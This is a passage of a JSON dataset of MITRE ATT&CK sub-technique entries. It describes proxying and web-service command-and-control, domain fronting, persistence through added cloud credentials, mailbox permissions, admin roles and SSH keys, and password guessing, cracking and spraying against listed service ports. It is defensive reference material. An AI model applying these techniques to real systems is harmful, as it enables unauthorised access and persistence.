    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including <a href=\"https://attack.mitre.org/software/S0040\">HTRAN</a>, ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.<!-- raw HTML omitted --><!-- raw HTML omitted -->By using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.</p>\n",
    "technique_references": [
      {
        "source_name": "Trend Micro APT Attack Tools",
        "url": "http://blog.trendmicro.com/trendlabs-security-intelligence/in-depth-look-apt-attack-tools-of-the-trade/",
        "description": "Wilhoit, K. (2013, March 4). In-Depth Look: APT Attack Tools of the Trade. Retrieved December 2, 2015.",
        "external_id": "none"
      },
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--69b8fd78-40e8-4600-ae4d-662c9d7afdb3",
    "platform": "linux|macos|windows",
    "tid": "T1090.002",
    "technique": "External Proxy",
    "tactic": "command-and-control",
    "datasources": "netflow-enclave-netflow|network-protocol-analysis|packet-capture|process-monitoring|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including <a href=\"https://attack.mitre.org/software/S0040\">HTRAN</a>, ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.<!-- raw HTML omitted --><!-- raw HTML omitted -->External connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.</p>\n",
    "technique_references": [
      {
        "source_name": "Trend Micro APT Attack Tools",
        "url": "http://blog.trendmicro.com/trendlabs-security-intelligence/in-depth-look-apt-attack-tools-of-the-trade/",
        "description": "Wilhoit, K. (2013, March 4). In-Depth Look: APT Attack Tools of the Trade. Retrieved December 2, 2015.",
        "external_id": "none"
      },
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--a782ebe2-daba-42c7-bc82-e8e9d923162d",
    "platform": "linux|macos|windows|network",
    "tid": "T1090.003",
    "technique": "Multi-hop Proxy",
    "tactic": "command-and-control",
    "datasources": "netflow-enclave-netflow|network-protocol-analysis|packet-capture",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>To disguise the source of malicious traffic, adversaries may chain together multiple proxies. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source. A particular variant of this behavior is to use onion routing networks, such as the publicly available TOR network. (Citation: Onion Routing)<!-- raw HTML omitted --><!-- raw HTML omitted -->In the case of network infrastructure, particularly routers, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain within the Wide-Area Network (WAN) of the enterprise.  By leveraging <a href=\"https://attack.mitre.org/techniques/T1601/001\">Patch System Image</a>, adversaries can add custom code to the affected network devices that will implement onion routing between those nodes.  This custom onion routing network will transport the encrypted C2 traffic through the compromised population, allowing adversaries to communicate with any device within the onion routing network.  This method is dependent upon the <a href=\"https://attack.mitre.org/techniques/T1599\">Network Boundary Bridging</a> method in order to allow the adversaries to cross the protected network boundary of the Internet perimeter and into the organization’s WAN. Protocols such as ICMP may be used as a transport.</p>\n",
    "technique_references": [
      {
        "source_name": "Onion Routing",
        "url": "https://en.wikipedia.org/wiki/Onion_routing",
        "description": "Wikipedia. (n.d.). Onion Routing. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--ca9d3402-ada3-484d-876a-d717bd6e05f2",
    "platform": "linux|macos|windows",
    "tid": "T1090.004",
    "technique": "Domain Fronting",
    "tactic": "command-and-control",
    "datasources": "packet-capture|ssl-tls-inspection",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may take advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS. (Citation: Fifield Blocking Resistent Communication through domain fronting 2015) Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, “domainless” fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).<!-- raw HTML omitted --><!-- raw HTML omitted -->For example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/481.html",
        "description": "none",
        "external_id": "CAPEC-481"
      },
      {
        "source_name": "Fifield Blocking Resistent Communication through domain fronting 2015",
        "url": "http://www.icir.org/vern/papers/meek-PETS-2015.pdf",
        "description": "David Fifield, Chang Lan, Rod Hynes, Percy Wegmann, and Vern Paxson. (2015). Blocking-resistant communication through domain fronting. Retrieved November 20, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--8a2f40cf-8325-47f9-96e4-b1ca4c7389bd",
    "platform": "azure-ad|azure|aws|gcp",
    "tid": "T1098.001",
    "technique": "Additional Cloud Credentials",
    "tactic": "persistence",
    "datasources": "aws-cloudtrail-logs|azure-activity-logs|gcp-audit-logs|stackdriver-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure AD.(Citation: Microsoft SolarWinds Customer Guidance)(Citation: Blue Cloud of Death)(Citation: Blue Cloud of Death Video) These credentials include both x509 keys and passwords.(Citation: Microsoft SolarWinds Customer Guidance) With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules.(Citation: Demystifying Azure AD Service Principals)<!-- raw HTML omitted --><!-- raw HTML omitted -->In infrastructure-as-a-service (IaaS) environments, after gaining access through <a href=\"https://attack.mitre.org/techniques/T1078/004\">Cloud Accounts</a>, adversaries may generate or import their own SSH keys using either the <!-- raw HTML omitted -->CreateKeyPair<!-- raw HTML omitted --> or <!-- raw HTML omitted -->ImportKeyPair<!-- raw HTML omitted --> API in AWS or the <!-- raw HTML omitted -->gcloud compute os-login ssh-keys add<!-- raw HTML omitted --> command in GCP.(Citation: GCP SSH Key Add) This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.(Citation: Expel IO Evil in AWS)(Citation: Expel Behind the Scenes)</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft SolarWinds Customer Guidance",
        "url": "https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/",
        "description": "MSRC. (2020, December 13). Customer Guidance on Recent Nation-State Cyber Attacks. Retrieved December 17, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Blue Cloud of Death",
        "url": "https://speakerdeck.com/tweekfawkes/blue-cloud-of-death-red-teaming-azure-1",
        "description": "Kunz, Bryce. (2018, May 11). Blue Cloud of Death: Red Teaming Azure. Retrieved October 23, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Blue Cloud of Death Video",
        "url": "https://www.youtube.com/watch?v=wQ1CuAPnrLM&feature=youtu.be&t=2815",
        "description": "Kunz, Bruce. (2018, October 14). Blue Cloud of Death: Red Teaming Azure. Retrieved November 21, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Demystifying Azure AD Service Principals",
        "url": "https://nedinthecloud.com/2019/07/16/demystifying-azure-ad-service-principals/",
        "description": "Bellavance, Ned. (2019, July 16). Demystifying Azure AD Service Principals. Retrieved January 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "GCP SSH Key Add",
        "url": "https://cloud.google.com/sdk/gcloud/reference/compute/os-login/ssh-keys/add",
        "description": "Google. (n.d.). gcloud compute os-login ssh-keys add. Retrieved October 1, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Expel IO Evil in AWS",
        "url": "https://expel.io/blog/finding-evil-in-aws/",
        "description": "A. Randazzo, B. Manahan and S. Lipton. (2020, April 28). Finding Evil in AWS. Retrieved June 25, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Expel Behind the Scenes",
        "url": "https://expel.io/blog/behind-the-scenes-expel-soc-alert-aws/",
        "description": "S. Lipton, L. Easterly, A. Randazzo and J. Hencinski. (2020, July 28). Behind the scenes in the Expel SOC: Alert-to-fix in AWS. Retrieved October 1, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--e74de37c-a829-446c-937d-56a44f0e9306",
    "platform": "windows|office-365",
    "tid": "T1098.002",
    "technique": "Exchange Email Delegate Permissions",
    "tactic": "persistence",
    "datasources": "office-365-audit-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may grant additional permission levels, such as ReadPermission or FullAccess, to maintain persistent access to an adversary-controlled email account. The <!-- raw HTML omitted -->Add-MailboxPermission<!-- raw HTML omitted --> <a href=\"https://attack.mitre.org/techniques/T1059/001\">PowerShell</a> cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox.(Citation: Microsoft - Add-MailboxPermission)(Citation: FireEye APT35 2018)(Citation: Crowdstrike Hiding in Plain Sight 2018)<!-- raw HTML omitted --><!-- raw HTML omitted -->This may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can assign more access rights to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex: <a href=\"https://attack.mitre.org/techniques/T1534\">Internal Spearphishing</a>), so the messages evade spam/phishing detection mechanisms.(Citation: Bienstock, D. - Defending O365 - 2019)</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft - Add-MailboxPermission",
        "url": "https://docs.microsoft.com/en-us/powershell/module/exchange/mailboxes/add-mailboxpermission?view=exchange-ps",
        "description": "Microsoft. (n.d.). Add-Mailbox Permission. Retrieved September 13, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye APT35 2018",
        "url": "https://www.fireeye.com/content/dam/collateral/en/mtrends-2018.pdf",
        "description": "Mandiant. (2018). Mandiant M-Trends 2018. Retrieved July 9, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Crowdstrike Hiding in Plain Sight 2018",
        "url": "https://www.crowdstrike.com/blog/hiding-in-plain-sight-using-the-office-365-activities-api-to-investigate-business-email-compromises/",
        "description": "Crowdstrike. (2018, July 18). Hiding in Plain Sight: Using the Office 365 Activities API to Investigate Business Email Compromises. Retrieved January 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Bienstock, D. - Defending O365 - 2019",
        "url": "https://www.slideshare.net/DouglasBienstock/shmoocon-2019-becs-and-beyond-investigating-and-defending-office-365",
        "description": "Bienstock, D.. (2019). BECS and Beyond: Investigating and Defending O365. Retrieved September 13, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--2dbbdcd5-92cf-44c0-aea2-fe24783a6bc3",
    "platform": "office-365",
    "tid": "T1098.003",
    "technique": "Add Office 365 Global Administrator Role",
    "tactic": "persistence",
    "datasources": "office-365-audit-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>An adversary may add the Global Administrator role to an adversary-controlled account to maintain persistent access to an Office 365 tenant.(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins) via the global admin role.(Citation: Microsoft O365 Admin Roles) <!-- raw HTML omitted --><!-- raw HTML omitted -->This account modification may immediately follow <a href=\"https://attack.mitre.org/techniques/T1136\">Create Account</a> or other malicious account activity.</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft Support O365 Add Another Admin, October 2019",
        "url": "https://support.office.com/en-us/article/add-another-admin-f693489f-9f55-4bd0-a637-a81ce93de22d",
        "description": "Microsoft. (n.d.). Add Another Admin. Retrieved October 18, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft O365 Admin Roles",
        "url": "https://docs.microsoft.com/en-us/office365/admin/add-users/about-admin-roles?view=o365-worldwide",
        "description": "Ako-Adjei, K., Dickhaus, M., Baumgartner, P., Faigel, D., et. al.. (2019, October 8). About admin roles. Retrieved October 18, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--6b57dc31-b814-4a03-8706-28bc20d739c4",
    "platform": "linux|macos",
    "tid": "T1098.004",
    "technique": "SSH Authorized Keys",
    "tactic": "persistence",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may modify the SSH <!-- raw HTML omitted -->authorized_keys<!-- raw HTML omitted --> file to maintain persistence on a victim host. Linux distributions and macOS commonly use key-based authentication to secure the authentication process of SSH sessions for remote management. The <!-- raw HTML omitted -->authorized_keys<!-- raw HTML omitted --> file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file is usually found in the user’s home directory under <!-- raw HTML omitted -->&lt;user-home&gt;/.ssh/authorized_keys<!-- raw HTML omitted -->.(Citation: SSH Authorized Keys) Users may edit the system’s SSH config file to modify the directives PubkeyAuthentication and RSAAuthentication to the value “yes” to ensure public key and RSA authentication are enabled. The SSH config file is usually located under <!-- raw HTML omitted -->/etc/ssh/sshd_config<!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may modify SSH <!-- raw HTML omitted -->authorized_keys<!-- raw HTML omitted --> files directly with scripts or shell commands to add their own adversary-supplied public keys. This ensures that an adversary possessing the corresponding private key may log in as an existing user via SSH.(Citation: Venafi SSH Key Abuse) (Citation: Cybereason Linux Exim Worm)</p>\n",
    "technique_references": [
      {
        "source_name": "SSH Authorized Keys",
        "url": "https://www.ssh.com/ssh/authorized_keys/",
        "description": "ssh.com. (n.d.). Authorized_keys File in SSH. Retrieved June 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Venafi SSH Key Abuse",
        "url": "https://www.venafi.com/blog/growing-abuse-ssh-keys-commodity-malware-campaigns-now-equipped-ssh-capabilities",
        "description": "Blachman, Y. (2020, April 22). Growing Abuse of SSH Keys: Commodity Malware Campaigns Now Equipped with SSH Capabilities. Retrieved June 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cybereason Linux Exim Worm",
        "url": "https://www.cybereason.com/blog/new-pervasive-worm-exploiting-linux-exim-server-vulnerability",
        "description": "Cybereason Nocturnus. (2019, June 13). New Pervasive Worm Exploiting Linux Exim Server Vulnerability. Retrieved June 24, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--f7827069-0bf2-4764-af4f-23fae0d181b7",
    "platform": "linux|macos|windows",
    "tid": "T1102.001",
    "technique": "Dead Drop Resolver",
    "tactic": "command-and-control",
    "datasources": "host-network-interface|netflow-enclave-netflow|network-protocol-analysis|packet-capture|ssl-tls-inspection",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.<!-- raw HTML omitted --><!-- raw HTML omitted -->Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.<!-- raw HTML omitted --><!-- raw HTML omitted -->Use of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).</p>\n",
    "technique_references": [
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--be055942-6e63-49d7-9fa1-9cb7d8a8f3f4",
    "platform": "linux|macos|windows",
    "tid": "T1102.002",
    "technique": "Bidirectional Communication",
    "tactic": "command-and-control",
    "datasources": "host-network-interface|netflow-enclave-netflow|network-protocol-analysis|packet-capture|ssl-tls-inspection",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. <!-- raw HTML omitted --><!-- raw HTML omitted -->Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.</p>\n",
    "technique_references": [
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--9c99724c-a483-4d60-ad9d-7f004e42e8e8",
    "platform": "linux|macos|windows",
    "tid": "T1102.003",
    "technique": "One-Way Communication",
    "tactic": "command-and-control",
    "datasources": "host-network-interface|netflow-enclave-netflow|network-protocol-analysis|packet-capture|ssl-tls-inspection",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service. Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response.<!-- raw HTML omitted --><!-- raw HTML omitted -->Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.</p>\n",
    "technique_references": [
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
    "platform": "linux|macos|windows|office-365|gcp|azure-ad|aws|azure|saas",
    "tid": "T1110.001",
    "technique": "Password Guessing",
    "tactic": "credential-access",
    "datasources": "authentication-logs|office-365-account-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target’s policies on password complexity or use policies that may lock accounts out after a number of failed attempts.<!-- raw HTML omitted --><!-- raw HTML omitted -->Guessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization’s login failure policies. (Citation: Cylance Cleaver)<!-- raw HTML omitted --><!-- raw HTML omitted -->Typically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:<!-- raw HTML omitted --><!-- raw HTML omitted -->* SSH (22/TCP)<!-- raw HTML omitted -->* Telnet (23/TCP)<!-- raw HTML omitted -->* FTP (21/TCP)<!-- raw HTML omitted -->* NetBIOS / SMB / Samba (139/TCP &amp; 445/TCP)<!-- raw HTML omitted -->* LDAP (389/TCP)<!-- raw HTML omitted -->* Kerberos (88/TCP)<!-- raw HTML omitted -->* RDP / Terminal Services (3389/TCP)<!-- raw HTML omitted -->* HTTP/HTTP Management Services (80/TCP &amp; 443/TCP)<!-- raw HTML omitted -->* MSSQL (1433/TCP)<!-- raw HTML omitted -->* Oracle (1521/TCP)<!-- raw HTML omitted -->* MySQL (3306/TCP)<!-- raw HTML omitted -->* VNC (5900/TCP)<!-- raw HTML omitted --><!-- raw HTML omitted -->In addition to management services, adversaries may “target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,” as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)<!-- raw HTML omitted --><!-- raw HTML omitted -->In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows “logon failure” event ID 4625.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/49.html",
        "description": "none",
        "external_id": "CAPEC-49"
      },
      {
        "source_name": "Cylance Cleaver",
        "url": "https://www.cylance.com/content/dam/cylance/pages/operation-cleaver/Cylance_Operation_Cleaver_Report.pdf",
        "description": "Cylance. (2014, December). Operation Cleaver. Retrieved September 14, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "US-CERT TA18-068A 2018",
        "url": "https://www.us-cert.gov/ncas/alerts/TA18-086A",
        "description": "US-CERT. (2018, March 27). TA18-068A Brute Force Attacks Conducted by Cyber Actors. Retrieved October 2, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--1d24cdee-9ea2-4189-b08e-af110bf2435d",
    "platform": "linux|macos|windows|office-365|azure-ad",
    "tid": "T1110.002",
    "technique": "Password Cracking",
    "tactic": "credential-access",
    "datasources": "authentication-logs|office-365-account-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use password cracking to attempt to recover usable credentials, such as plaintext passwords, when credential material such as password hashes are obtained. <a href=\"https://attack.mitre.org/techniques/T1003\">OS Credential Dumping</a> is used to obtain password hashes, this may only get an adversary so far when <a href=\"https://attack.mitre.org/techniques/T1550/002\">Pass the Hash</a> is not an option. Techniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network.(Citation: Wikipedia Password cracking) The resulting plaintext password resulting from a successfully cracked hash may be used to log into systems, resources, and services in which the account has access.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/55.html",
        "description": "none",
        "external_id": "CAPEC-55"
      },
      {
        "source_name": "Wikipedia Password cracking",
        "url": "https://en.wikipedia.org/wiki/Password_cracking",
        "description": "Wikipedia. (n.d.). Password cracking. Retrieved December 23, 2015.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--692074ae-bb62-4a5e-a735-02cb6bde458c",
    "platform": "linux|macos|windows|aws|gcp|azure|office-365|azure-ad|saas",
    "tid": "T1110.003",
    "technique": "Password Spraying",
    "tactic": "credential-access",
    "datasources": "authentication-logs|office-365-account-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. ‘Password01’), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. (Citation: BlackHillsInfosec Password Spraying)<!-- raw HTML omitted --><!-- raw HTML omitted -->Typically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:<!-- raw HTML omitted --><!-- raw HTML omitted -->* SSH (22/TCP)<!-- raw HTML omitted -->* Telnet (23/TCP)<!-- raw HTML omitted -->* FTP (21/TCP)<!-- raw HTML omitted -->* NetBIOS / SMB / Samba (139/TCP &amp; 445/TCP)<!-- raw HTML omitted -->* LDAP (389/TCP)<!-- raw HTML omitted -->* Kerberos (88/TCP)<!-- raw HTML omitted -->* RDP / Terminal Services (3389/TCP)<!-- raw HTML omitted -->* HTTP/HTTP Management Services (80/TCP &amp; 443/TCP)<!-- raw HTML omitted -->* MSSQL (1433/TCP)<!-- raw HTML omitted -->* Oracle (1521/TCP)<!-- raw HTML omitted -->* MySQL (3306/TCP)<!-- raw HTML omitted -->* VNC (5900/TCP)<!-- raw HTML omitted --><!-- raw HTML omitted -->In addition to management services, adversaries may “target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,” as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)<!-- raw HTML omitted --><!-- raw HTML omitted -->In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows “logon failure” event ID 4625.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/565.html",
        "description": "none",
        "external_id": "CAPEC-565"
      },
      {
        "source_name": "BlackHillsInfosec Password Spraying",
        "url": "http://www.blackhillsinfosec.com/?p=4645",
        "description": "Thyer, J. (2015, October 30). Password Spraying & Other Fun with RPCCLIENT. Retrieved April 25, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "US-CERT TA18-068A 2018",
        "url": "https://www.us-cert.gov/ncas/alerts/TA18-086A",
        "description": "US-CERT. (2018, March 27). TA18-068A Brute Force Attacks Conducted by Cyber Actors. Retrieved October 2, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Trimarc Detecting Password Spraying",
        "url": "https://www.trimarcsecurity.com/single-post/2018/05/06/Trimarc-Research-Detecting-Password-Spraying-with-Security-Event-Auditing",
